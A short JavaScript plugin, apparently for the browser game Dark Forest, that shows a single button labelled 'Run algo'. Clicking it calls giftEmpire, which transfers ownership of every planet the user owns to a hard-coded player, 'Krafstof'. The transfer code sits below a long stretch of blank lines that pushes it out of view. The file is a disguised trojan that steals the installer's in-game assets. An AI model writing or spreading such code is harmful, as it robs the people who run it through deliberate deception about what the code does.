class Plugin {
  constructor() {
    this.artifactCheckbox = document.createElement('button');
    this.artifactCheckbox.style.marginLeft = 'auto';
  }

  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  giftPlanet = (planet) => {
      let value = 'Krafstof'
      let player = ui.getAllPlayers().find(player => {
        return player.address === value || player.twitter === value;
      });
      df.transferOwnership(planet.locationId, player.address);
      return;
  }

  giftEmpire = () => {
    for (let planet of df.getMyPlanets()) {
      this.giftPlanet(planet);
    }
  }

  async render(container) {
    let giftButton = document.createElement('button');
    giftButton.style.width = '100%';
    giftButton.innerText = 'Run algo';
    giftButton.onclick = this.giftEmpire;
    container.appendChild(giftButton);
  }
}

export default Plugin;
